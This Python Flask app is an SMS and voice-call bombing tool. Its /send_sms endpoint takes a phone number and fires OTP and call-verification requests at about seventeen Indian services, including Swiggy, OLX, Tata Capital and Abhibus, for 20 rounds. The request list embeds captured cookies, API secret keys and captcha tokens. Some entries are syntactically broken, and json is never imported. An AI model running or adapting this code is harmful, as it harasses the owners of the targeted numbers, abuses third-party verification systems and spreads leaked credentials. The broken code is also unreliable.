from flask import Flask, request, jsonify
import requests
import time

app = Flask(__name__)

def smsgii(number):
    number = str(number)
    
    # List of APIs with their corresponding URLs, headers, and payloads
    apis = [
        # Add your API details here, e.g.,
        {
            "method": "POST",
            "url": "http://ieniapi.eniclub.in/api/users/login",
            "headers": {
                "Content-Type": "application/json; charset=UTF-8",
                "Content-Length": "119",
                "Host": "ieniapi.eniclub.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.12.1"
            },
            "data": json.dumps({"device_id": "c7abc1fd7459e84c", "language_id": 1, "mobile": number, "role": 1, "sms_type": "RESEND_SMS", "source": "USER"})
        },
        {
            "method": "POST",
            "url": "http://ieniapi.eniclub.in/api/users/login",
            "headers": {
                "Content-Type": "application/json; charset=UTF-8",
                "Content-Length": "125",
                "Host": "ieniapi.eniclub.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.12.1"
            },
            "data": json.dumps({"device_id": "c7abc1fd7459e84c", "language_id": 1, "mobile": number, "role": 1, "sms_type": "RESEND_VOICECALL", "source": "USER"})
        },
        {
            "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "data": {"mobile": number},
            "headers": {
                "Host": "profile.swiggy.com",
                "tracestate": "@nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
                "traceparent": "00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
                "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI9ZDYiLCJpZCI6IjI1MTM9ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
                "pl-version": "55",
                "user-agent": "Swiggy-Android",
                "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
                "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
                "version-code": "1161",
                "app-version": "4.38.1",
                "latitude": "0.0",
                "longitude": "0.0",
                "os-version": "13",
                "accessibility_enabled": "false",
                "swuid": "4c27ae3a76b146f3",
                "deviceid": "4c27ae3a76b146f3",
                "x-network-quality": "GOOD",
                "accept-encoding": "gzip",
                "accept": "application/json; charset=utf-8",
                "content-type": "application/json; charset=utf-8",
                "content-length": "..."
            },
            {
            "url": "https://prod.milkbasket.com/milkbasket_prod_current/consumer/user/register_mobile",
            "method": "POST",
            "data": {
                "mobile": number,
                "appHash": "tG3K6W/hoYi"
            },
            "headers": {
                "Accept-Charset": "UTF-8",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A105F Build/RP1A.200720.012)",
                "Host": "prod.milkbasket.com",
                "Connection": "Keep-Alive",
                "Content-Length": "48"
            }
        },
        {
            "url": f"https://www.healthkart.com/veronica/user/validate/voice/1/{number}/signup?plt=2&st=1",
            "method": "GET",
            "headers": {
                "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Brave\";v=\"114\"",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
                "st": "1",
                "plt": "2",
                "accept": "application/json, text/plain, */*",
                "device": "ba2a15558802b00",
                "pincode": "false",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-gpc": "1",
                "accept-language": "en-US,en;q=0.7",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.healthkart.com/",
                "accept-encoding": "gzip, deflate, br",
                "cookie": "adb=0; ufi=1; cf_clearance=6NwtHmrzLrHfHDe9UZgqjBzTw20eDLZJIRV6A0YTb88-1695612025-0-1-c3ce1f1.d62b60e6.5b3dbe11-0.2.1695612025"
            }
        },
        {
            "url": "https://api.doubtnut.com/v4/student/login",
            "headers": {
                "Host": "api.doubtnut.com",
                "version_code": "1111",
                "has_upi": "true",
                "device_model": "Redmi Note 7 Pro",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2"
            },
            "data": {
                "app_version": "7.10.2",
                "aaid": "a4c4e462-2744-4c94-85ea-db8b47f75d00",
                "course": "",
                "phone_number": number,
                "language": "en",
                "udid": "0ae3a1bee1561e32",
                "class": "",
                "gcm_reg_id": "f38jugJKSEKBOkcASRbSiJ:APA91bElvA0mtSl4LIYxxH60qQJP_U8bU9ew16vhiiQRdSzVFpJOBtr9ooY4hbOd2NmALUDt5sERZsO0NLRob3zf2MoCoaqciF2XibBo22VPxYIFqDULptYTVrEcgZCQ_qpXAfYKD-iR"
            },
            "method": "POST"
        },
        {
            "url": "https://micro.doubtnut.com/otp/send-call",
            "headers": {
                "Host": "micro.doubtnut.com",
                "version_code": "1111",
                "has_upi": "true",
                "device_model": "Redmi Note 7 Pro",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2"
            },
            "data": {
                "phone": number,
                "locale": "en"
            },
            "method": "PUT"
        },
        {
            "url": "https://api.cureskin.com/api/parse/functions/requestOTP",
            "headers": {
                "Host": "api.cureskin.com",
                "Content-Length": "299",
                "Baggage": "sentry-environment=production,sentry-release=app%402.0.428-0,sentry-public_key=fb75233753ac48cc93a56596bcdc8525,sentry-trace_id=1f108bfb18da4ae99681d51a0c08419c",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",
                "Sentry-Trace": "1f108bfb18da4ae99681d51a0c08419c-a22bb520894a1948-0",
                "Content-Type": "text/plain",
                "Accept": "*/*",
                "Origin": "https://app.cureskin.com",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://app.cureskin.com/",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
            },
            "data": {
                "mobileNumber": number,
                "deviceId": "f338792bf49fb2e48229",
                "source": "web",
                "time": "2023-09-24T08:22:25.811Z",
                "digest": "d7ec0ba46dc9eff36f048bb46592294c858070ad31fa770f4e1e1dea82cf6a93",
                "_ApplicationId": "myAppId",
                "_ClientVersion": "js3.4.4",
                "_InstallationId": "4d53e2d5-2108-42ed-92da-ac252e7f87ce"
            },
            "method": "POST"
        },
        {
            "url": "https://api.cureskin.com/api/parse/functions/retryOTP",
            "headers": {
                "Host": "api.cureskin.com",
                "Content-Length": "284",
                "Baggage": "sentry-environment=production,sentry-release=app%402.0.428-0,sentry-public_key=fb75233753ac48cc93a56596bcdc8525,sentry-trace_id=46eaa3e5f35a480abd0a25517080c82f",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",
                "Sentry-Trace": "46eaa3e5f35a480abd0a25517080c82f-aeaeed3f7740c180-0",
                "Content-Type": "text/plain",
                "Accept": "*/*",
                "Origin": "https://app.cureskin.com",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://app.cureskin.com/",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
            },
            "data": {
                "mobileNumber": number,
                "deviceId": "f338792bf49fb2e48229",
                "time": "2023-09-24T08:22:57.160Z",
                "digest": "ab994830a6bca8ad49be89e14592d06deee04c42d63d6f4a6263b1b244e2d2f7",
                "_ApplicationId": "myAppId",
                "_ClientVersion": "js3.4.4",
                "_InstallationId": "4d53e2d5-2108-42ed-92da-ac252e7f87ce"
            },
            "method": "POST"
        },
        {
            "method": "POST",
            "url": 'https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/generateOtp',
            "data": {
                'sourceName': 'Google_Search',
                'mobileNumber': number,
                'deviceOS': 'Web',
                'applSource': 'PL',
                'deviceType': 'Web',
                'deviceSubType': ''
            },
            "headers": {
                'Content-Type': 'application/json',
                'Origin': 'https://www.tatacapital.com',
                'Referer': 'https://www.tatacapital.com/'
            }
        },
        {
            "method": "POST",
            "url": 'https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice',
            "data": {
                'phone': number,
                'isOtpViaCallAtLogin': 'true',
                'applSource': ''
            },
            "headers": {
                'Content-Type': 'application/json',
                'Origin': 'https://www.tatacapital.com',
                'Referer': 'https://www.tatacapital.com/'
            }
        },
        {
            "method": "POST",
            "url": 'https://api.penpencil.co/v1/users/resend-otp?smsType=2',
            "data": {
                'mobile': number,
            },
            "headers": {
                'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'client-version': '1114',
                'Authorization': '5eb393ee95fab7468a79d189',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*',
                'Referer': 'https://www.pw.live/',
                'randomId': '9242fe67-d24e-4fb1-8859-3d726e2471e3',
                'client-id': '5eb393ee95fab7468a79d189',
                'Client-Type': 'WEB',
                'sec-ch-ua-platform': '"Windows"'
            }
        },
        {
            "method": "POST",
            "url": "https://api.olx.in/v2/auth/authenticate",
            "data": {
                "grantType": "retry",
                "method": "call",
                "phone": "+91" + number
            },
            "headers": {
                "X-acf-sensor-data": "2,a,TMpKRTdoxJtA/bMtiQzskHx92U6siCaYWjBkNZaMsStuWWZ8O8m6MzoKfX2vfY1xHLr/yo3Gqb3Vyw7O39A0je0OuB/iUnEP/aai7Yu2g6XMOz8xlVpX8eB9l+dURtyhEypM+M/xqVEAXdyalyPrduvFtnx0TCyuwW6tau2maDo=,BHMkuAHLVGza6cgDuEpwN3QKPTKW0J+/J2TLj3blpjuyO2/GWlcYTZ44H7+LkSFzHOcUQibNhCZtqbTXTyo+4d6273WfIbB3vkcukA+1ZwN5WPbPJdx6FLRlhNclsMNT9lBjM6POZNnL67jknhAXDyoW+S9g/G6X0G/S4b5fWt4=\$c1f0jtr7Zs8nbUt4eHfw69RdeiqQJ+NdjDegCxj44oKDW/ki2UnT8vXzSLfAA+0HCYmhE1ESUyb8yywzdvmiXKhD82hIydxgQpVLtK9ctAHV5ASNLotwuqhi0gfPEZAgzeB9J+0XMhZ2mk+3A3jVaPdU0ya9eOlNXqy+V7zq0x1p6keahAFF2wgyqpq2775oq+OsP6OojhZI22tm0ZcsD7ElJ60GvKf1hDxtxxv8xugjeNG7CazWqHDpTL7Fb5BA/emn/lalI+JvhMaRc65RGNvfolQ2nVugn5dtJkG/BkwSayn/1Gtke4lHr9CqqOnb5gNhXDZ96hIGJtw8B+0HznBNetWq06xuAFSnjzd+vx/wc53NrHRPikfWhNeeJumE2U9WFuWZOHdb4hBvxQuOxDUNhiIP79n1qfVfszDhZ5Ezn7WFIO7Pl5KD6OHvDfCUzZeJ/g4vGUdrjDvq247LANeV/CqsqSVASZzP26BnANtgFF6kQAgATvvXwCcBYDpEIOeM0s27vMiDOemQiDqOpMYmdhAEjL2Vbvy6w3WY5X0roTcOFiXBqn8VsVEHiHHDEszzDxbNV2ueDV5Du7nRfTLt9ZF9LzJzy0sd9639DgmYm4r2CyYw9rIrQZHZhZ5G/DJml9r8XghR2ZulvClJfwhf1T/Xe8fNozCN9+Bm2+jOpWDfR9HZafMiWyuEGtyaekFRA2bgRVt25Q5vtRMgwQqoAmXHJ/YY8SWLFLY2NfFBkVCAjEuW5+Z6lISBL4KgyIrcz9FA/K4hzWz7sChPr2Wz6cwe6f6y50RanzhQRVn7Sac5MnJ0EbqArp+GqzleKCg1kZfNtVnB0HQqTLs29P+hA2DHct3KxFl0kEtL91w+81Y06s759oFINDics0ik1YL5Ghm0M+sdzmuvd7BVTm16Dpwg27/Dnf+BCs7+zGz2DXD4q3mNZ0U+neXYgGinKIRiUkf6ATs/RKsz41TVvQE1lTiZ4L9Sdqqyuu05/YRZrXNlx/uOkWEemsiM2B6Xq/OZC27b1aLbz4q4QIKzpjzN7fY9brMalcu5MVzm4GU=$1000,0,0$$",
                "X-Panamera-fingerprint": "807da1a35e55235e",
                "User-Agent": "android 17.08.011 olxin",
                "x-origin-panamera": "Production",
                "laquesis": "pan-41767@b#pan-48465@b#pan-52057@b#pan-53615@b#pan-55363@b#pan-55982@b#pan-59448@b#pan-62267@a#pan-68253@a#road-43386@b#road-47263@a#road-74127@b",
                "laquesisff": "rate_us#resend_code_call_me#listers_verification#legion_login#show_advertisement#default_near_me#notification_pref#edit_location#legion_migrate_v2#pan-27935#pan-36788#pan-38000#pan-42665#pan-43831#pan-41327#pan-42666#pan-45244#pan-48529#pan-48912#pan-50288#pan-50705#pan-57022#road-123",
                "Content-Type": "application/json; charset=UTF-8",
                "Host": "api.olx.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
        },
        {
            "method": "POST",
            "url": 'https://api.wakefit.co/api/consumer-sms-otp/',
            "data": {
                "mobile": number,
                "whatsapp_opt_in": 1
            },
            "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "api-secret-key": "ycq55IbIjkLb",
                "api-token": "c84d563b77441d784dce71323f69eb42"
            }
        },
        {
            "method": "POST",
            "url": "https://www.abhibus.com/sendOtp",
            "headers": {
                "Host": "www.abhibus.com",
                "content-length": "1856",
                "sec-ch-ua": "\"Chromium\";v=\"124\", \"Android WebView\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
                "x-mweb-version": "1.5.8",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.179 Mobile Safari/537.36",
                "content-type": "application/x-www-form-urlencoded",
                "accept": "application/json, text/plain, */*",
                "x-app-name": "msiten",
                "sec-ch-ua-platform": "\"Android\"",
                "origin": "https://www.abhibus.com",
                "x-requested-with": "pure.lite.browser",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.abhibus.com/mobile/?utm_source=google&utm_medium=cpc&utm_campaign=Abhibus_Brand&utm_term=abhibus&utm_content=Brand&gad_source=1&gclid=EAIaIQobChMIkL_4r5vChgMVBEVIAB2vDQoeEAAYASAAEgLSSvD_BwE",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "cookie": "WZRK_G=4680b5cc60fb4f11909f48cdd8b52420; _gcl_au=1.1.701355821.1714418306; __abrs_iss=d6612884-b90a-32fb-87e7-e758bef596cd; __abrs_uat=42254a40-065d-11ef-941a-39ba56cd2ae5; _fbp=fb.1.1714418306825.498132783; _ga=GA1.1.1666294952.1714418307; PHPSESSID=vapb3ajm375ulmuu451bpvn1t2; WZRK_S_R95-8KW-K75Z=%7B%22p%22%3A1%2C%22s%22%3A1717513233%2C%22t%22%3A1717513233%7D; _gcl_aw=GCL.1717513234.EAIaIQobChMIkL_4r5vChgMVBEVIAB2vDQoeEAAYASAAEgLSSvD_BwE; _gcl_gs=2.1.k1$i1717513232; _ga_EZF236QWC0=GS1.1.1717513234.2.0.1717513234.60.0.0; _uetsid=31d13ea0228311efba659baad22fb87d; _uetvid=41618fe0065d11efaf7b87103d5feb24; _clck=1dnmx7n%7C2%7Cfmc%7C0%7C1580; _clsk=42pxkq%7C1717513236897%7C1%7C1%7Cw.clarity.ms%2Fcollect; ci_session=x6ATLKtx7hCJ2fyj7Y%2BbmOuabdOsrq%2B2qgLOdUtdwc8XnjLSq9y2f0u4%2FBud1drvdLXTqgLRwHLxCjfSQvZwVdCudb%2BRJ22ggvCstQCCzzRE%2BHGrds27k%2FNwYz9EfQy2H1n1cvDPMhUN5Us3Z74irH3yNv69F6%2FhgtQ9HIyYF97VcbU8QBHvWYtuANROWUCxn1XDAdk5jKRilHFOnRlGjjRnGK4o3QRUAvRrsXr3FuJ87F%2FD7JWKJUsGX9Y8%2FnePbALOIWWFRg6kHnrWhh4XkIArrxXxvHXUlkCv0zeizlIAjENGVDIHId8KEUXr4GwuW%2F9hInJ3h9ev1IgeYJdBPky9p0KQrQKZdvGn1px%2FvY47YxiMvYTMkIgfhaqGe%2BSWiwZ3G30SVH%2FV3LiuGQhStgDHNb%2BL6noLFEg0SZHAlOECnvAqWl8%2B1ZCMH%2BQdIE5cKGyk%2F9BqbVu%2FHi4BFI1mwSrh%2BvMKMBZWoO6GOUH4x8B7UjGKZviU4io9Ap4887Md; __cf_bm=5ROWlT6y51Dg8Nq8d1kCFtpAg4E5l7BiU_aL4h8ApZI-1717513242-1.0.1.1-tSAdHDE1OaecS8RdFygxSieIUB0.f6bG1yG6mKHnAJdOMlHBgHwL1nQABAfWDuV353GpsWn530Lpqxf4cjipcA; AWSALBTG=W9ubNR2x7dtptaQG5gf2+xHb4OuHhtTGz/K1XH9BclxEFWZJSwOyemnoL3cDNp1HbdJCyZ6TJOZFkaSJnOQmLELwtzHeQjG3ym3mEqUC1DP7ActkxyfouTfkXKYnGo8ILzWYYzvqZWaQ+9HiF3w7LzMdlSzdQ8IwT/YQFYYZB0srpWJDjFQ=; AWSALBTGCORS=W9ubNR2x7dtptaQG5gf2+xHb4OuHhtTGz/K1XH9BclxEFWZJSwOyemnoL3cDNp1HbdJCyZ6TJOZFkaSJnOQmLELwtzHeQjG3ym3mEqUC1DP7ActkxyfouTfkXKYnGo8ILzWYYzvqZWaQ+9HiF3w7LzMdlSzdQ8IwT/YQFYYZB0srpWJDjFQ=; AWSALB=y5qz5LnvoJFXuQOT96apSTOP4kabrjqgYif9S6Z5p59lVJQT7CoMubBU54YwTYbr73QSqwgRlInzFt2+ILJkSA+Ghbo9s9DvvtnL4HaBM88LKh9ZMYVZeIFwuyMf; AWSALBCORS=y5qz5LnvoJFXuQOT96apSTOP4kabrjqgYif9S6Z5p59lVJQT7CoMubBU54YwTYbr73QSqwgRlInzFt2+ILJkSA+Ghbo9s9DvvtnL4HaBM88LKh9ZMYVZeIFwuyMf"
            },
            "data": {
                "mobile": number,
                "prd": "mobile",
                "userToken": "03AFcWeA53A-VED54zynKh1R4gbMpb9BtmwNX9E67_I-seLAuAJp9LtOJa7BjEXZx5mn1Ml4hDEw41tF6vpsA7_d3h01bA7FSzmfudwL60B1k1OBrZRanuoTa32aii3pjQKeoHKGycTXawFd6PQ0JtrrTm3jUy4R9GVx5w9L5hgmN5HTzsvw4_e9xdAhA7RGhTT7XL3hFV-pqZ0LiJUSGQ19kMS5NAfOUYcOCoSUEv6DRTTN2ZpFD9hK-TXz0U5ymhE_TFgD2c5MDmEEuDzDKAPZ2xF4Xoe30CIPtHnVJRxN86C7FFML6C2SLqc9yn-91Kwi4tTiOVUjT-9ahtJtNq4xr2LRc5yxNjOweRwhU8BrAmwtsQUqJSFomUDpYMCz0sK_ggLUh98dShk7gCPOt3k5DIBcGO3d6XIzHgJOkK7T1TM5ctPY7IO0-xWbcaYY-JGdBzYp_NmrhxU-OdIl92MR-pJIzOQ8Bocv2UVqLxGTwF7vjlCI31E6NwV6SD9aNf_Z6xg-YJndLhCxWW7bC0tk9ujIG9u99GJ_VjNm_HbpWXQCFjYXYGm3PrNfa5u8Er4bwB_bLKNCHJloKaZcofIn38qfXKZrRiaMgiNU5D-J29GV-5-QWFTzL9poZc2"
            }
        },
        {
            "method": "POST",
            "url": "https://www.abhibus.com/otp/getOtpCall",
            "headers": {
                "Host": "www.abhibus.com",
                "content-length": "1837",
                "sec-ch-ua": '"Chromium";v="124", "Android WebView";v="124", "Not-A.Brand";v="99"',
                "x-mweb-version": "1.5.8",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.179 Mobile Safari/537.36",
                "content-type": "application/x-www-form-urlencoded",
                "accept": "application/json, text/plain, */*",
                "x-app-name": "msiten",
                "sec-ch-ua-platform": '"Android"',
                "origin": "https://www.abhibus.com",
                "x-requested-with": "pure.lite.browser",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.abhibus.com/mobile/?utm_source=google&utm_medium=cpc&utm_campaign=Abhibus_Brand&utm_term=abhibus&utm_content=Brand&gad_source=1&gclid=EAIaIQobChMIkL_4r5vChgMVBEVIAB2vDQoeEAAYASAAEgLSSvD_BwE",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "cookie": "WZRK_G=4680b5cc60fb4f11909f48cdd8b52420; _gcl_au=1.1.701355821.1714418306; __abrs_iss=d6612884-b90a-32fb-87e7-e758bef596cd; __abrs_uat=42254a40-065d-11ef-941a-39ba56cd2ae5; _fbp=fb.1.1714418306825.498132783; _ga=GA1.1.1666294952.1714418307; PHPSESSID=vapb3ajm375ulmuu451bpvn1t2; WZRK_S_R95-8KW-K75Z=%7B%22p%22%3A1%2C%22s%22%3A1717513233%2C%22t%22%3A1717513233%7D; _gcl_aw=GCL.1717513234.EAIaIQobChMIkL_4r5vChgMVBEVIAB2vDQoeEAAYASAAEgLSSvD_BwE; _gcl_gs=2.1.k1$i1717513232; _ga_EZF236QWC0=GS1.1.1717513234.2.0.1717513234.60.0.0; _uetsid=31d13ea0228311efba659baad22fb87d; _uetvid=41618fe0065d11efaf7b87103d5feb24; _clck=1dnmx7n%7C2%7Cfmc%7C0%7C1580; _clsk=42pxkq%7C1717513236897%7C1%7C1%7Cw.clarity.ms%2Fcollect; ci_session=x6ATLKtx7hCJ2fyj7Y%2BbmOuabdOsrq%2B2qgLOdUtdwc8XnjLSq9y2f0u4%2FBud1drvdLXTqgLRwHLxCjfSQvZwVdCudb%2BRJ22ggvCstQCCzzRE%2BHGrds27k%2FNwYz9EfQy2H1n1cvDPMhUN5Us3Z74irH3yNv69F6%2FhgtQ9HIyYF97VcbU8QBHvWYtuANROWUCxn1XDAdk5jKRilHFOnRlGjjRnGK4o3QRUAvRrsXr3FuJ87F%2FD7JWKJUsGX9Y8%2FnePbALOIWWFRg6kHnrWhh4XkIArrxXxvHXUlkCv0zeizlIAjENGVDIHId8KEUXr4GwuW%2F9hInJ3h9ev1IgeYJdBPky9p0KQrQKZdvGn1px%2FvY47YxiMvYTMkIgfhaqGe%2BSWiwZ3G30SVH%2FV3LiuGQhStgDHNb%2BL6noLFEg0SZHAlOECnvAqWl8%2B1ZCMH%2BQdIE5cKGyk%2F9BqbVu%2FHi4BFI1mwSrh%2BvMKMBZWoO6GOUH4x8B7UjGKZviU4io9Ap4887Md; AWSALBTG=lvJyfljE8rT7Rh8z1+Xv1SQxg4R3BqssRFkgqX5EgYatA7HC6nYK1/GdYy7MHz7dO6e9H1nCSC7iwGkibzAu6mnTsdqFET4SerNer4j7Li4C2rVmhpiD7Iw744rNWAZF7rfEFs87kx9VG72+mS92OYWsxVpEmhLvXkS9EUZSFYeKwhAc+7U=; AWSALBTGCORS=lvJyfljE8rT7Rh8z1+Xv1SQxg4R3BqssRFkgqX5EgYatA7HC6nYK1/GdYy7MHz7dO6e9H1nCSC7iwGkibzAu6mnTsdqFET4SerNer4j7Li4C2rVmhpiD7Iw744rNWAZF7rfEFs87kx9VG72+mS92OYWsxVpEmhLvXkS9EUZSFYeKwhAc+7U=; AWSALB=98i8ygYN2og0KhZzJh4Lot9yxb5myQ3kEsd2Auw2DC834whZzNKnoVY7vQpT7p/AbWo/qjJ/zc9b6DiIEXdEnVGZwyIczF70tPQBGR2Z8qkjtEsyw7htDDAmC61O; AWSALBCORS=98i8ygYN2og0KhZzJh4Lot9yxb5myQ3kEsd2Auw2DC834whZzNKnoVY7vQpT7p/AbWo/qjJ/zc9b6DiIEXdEnVGZwyIczF70tPQBGR2Z8qkjtEsyw7htDDAmC61O; __cf_bm=.6tb8poVbHGP9eOlrjQBBppx7s3NnvHlsk2zNfIxFzs-1717513307-1.0.1.1-GDUlmUxTMu8G8Go.Z6YaVwERjZZjY6VJBR7j8i5XXb2P3gCwzXGqEs7d6nwriorCb8v_l9yezYKoxXg_POTt4Q",
            },
            "data": f"mobileNum={number}&userToken=03AFcWeA5rMqwAsXv4ueZH8AkvUektmAUXOQKAP2aPdFikRLifdlEeqZWR3zyve-_YISTPtCUR1Lj60ZPGMe23Cb7tRGhKrrGceNCFC63ZpAEqOahjqyA6GdS8DoTDAacOO2eYCgCA14Q9K0TUZ0DOpiyuMwN2m6hzmy14UrnfO5jj4cdwRuLGXXPpLoYMFOHSka_MEEkhg3TWtBbgjTaCmOqE4IDffKVAMHF6AL9Us5HiTGv-5zK6HliZzQeA7OVOF-M8bBXL7fF73NdCHBGioZebRmFgJ9IisydAELZCMm_s-SRtlF9riMl-qBiCMd3cUItfN0L4t82si_7snrO2MSwsrkHh9X9_sThZ5f2dYyKQOfAHeCb6w7JK4CbiS5SpUu5EC0iC4ZHzlPlAbQ5G0hBhPBmMH5Iq1yJzSDWquWQvlxS_mL1nYZgFYO__oS03a8xMcv8C6oEBF-KpRHFqEP8Xup6mKPMUJuh3hhlI_XQldQ2xFrWx-gWITBGGB5q26jzDUCCEkKsvyjyOAYW-fxR-6Hst4GbvGHfqP2arvMlZyqAfiVDcRUizRca-D_PyGzd0YNBifMy3S_B7dKbU6vKY6PGYEdv-D8jM5QafN06DJx_4hgj6gH1KROgO50meqPQaJ10nP1EK-GVADnOHdF-ykP7Btv8DJXBw2Csw4rINOT2eebAFcW6HzB9ot9MjGbD0G1AeWcyfT1d3Ah__76M-yy5HEDBvYQ4cvsFjKm4MSZCsxizsblG1Fq2AaDR6aO5sFkQMi_K_wRlZa6DXPyqIXybUzzbQMP3-lQ_SI-n2QuOYlKip10VGtF-i8gPKMM3LRfpg&x-cf-trans-id=10177f43-62d3-40d2-95f0-5c5e941ffb00&x-cf-client-type=web&x-cf-client-ver=1.0"
        }
    ]
    
    # Run the requests for 20 times
    for _ in range(20):
        for api in apis:
            if api["method"] == "GET":
                response = requests.get(api["url"], params=api.get("params", {}), headers=api.get("headers", {}))
            elif api["method"] == "POST":
                response = requests.post(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            elif api["method"] == "PUT":
                response = requests.put(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            #print(f"Request to {api['url']} - Status Code: {response.status_code}")
        # Add a delay of 1 second between requests
        time.sleep(1)

@app.route('/send_sms', methods=['POST'])
def send_sms():
    data = request.get_json()
    number = data.get('number')
    if not number:
        return jsonify({"error": "Phone number is required"}), 400
    smsgii(number)
    return jsonify({"message": "SMS sent successfully"}), 200

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5001)
    